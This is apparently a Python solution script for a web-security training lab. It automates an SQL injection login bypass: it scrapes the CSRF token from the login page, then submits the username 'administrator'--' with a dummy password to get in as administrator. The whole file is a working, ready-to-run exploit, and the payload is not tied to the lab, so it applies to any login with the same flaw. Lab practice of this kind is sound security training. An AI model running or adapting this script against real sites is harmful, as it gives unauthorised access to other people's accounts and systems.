# === Standard Library ===
import sys

# === Third-Party ===
try:
    import requests
except ImportError:
    raise ImportError("Install with: pip install requests")

# === Config ===
PROXY = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}
USE_PROXY = False

# === Exploit Function ===
def login_bypass(base_url):
    login_url = f"{base_url}/login"
    session = requests.Session()

    try:
        # 1. Fetch CSRF token (if present)
        r = session.get(login_url, proxies=PROXY if USE_PROXY else None)
        csrf_token = None
        if "csrf" in r.text:
            import re
            token_match = re.search(r'name="csrf" value="([^"]+)"', r.text)
            if token_match:
                csrf_token = token_match.group(1)
                print(f"[+] CSRF token found: {csrf_token}")
            else:
                print("[-] CSRF token not found. Lab may be broken.")
                return

        # 2. Build login payload
        data = {
            "username": "administrator'--",
            "password": "irrelevant"
        }
        if csrf_token:
            data["csrf"] = csrf_token

        print(f"[*] Sending login bypass payload to {login_url}")
        res = session.post(login_url, data=data, proxies=PROXY if USE_PROXY else None)

        # 3. Evaluate result
        if "Log out" in res.text or "/logout" in res.text:
            print("[+] Login bypass successful! Logged in as administrator.")
        else:
            print("[-] Bypass failed. Try again manually or check response.")

    except Exception as e:
        print(f"[!] Error: {e}")

# === Main ===
if __name__ == "__main__":
    print("\n=== SQLi Login Bypass Lab ===")
    url = input("Enter the full lab URL (e.g., https://lab-id.web-security-academy.net): ").strip().rstrip('/')
    if not url.startswith("http"):
        print("[-] Invalid URL format.")
        sys.exit(1)

    login_bypass(url)
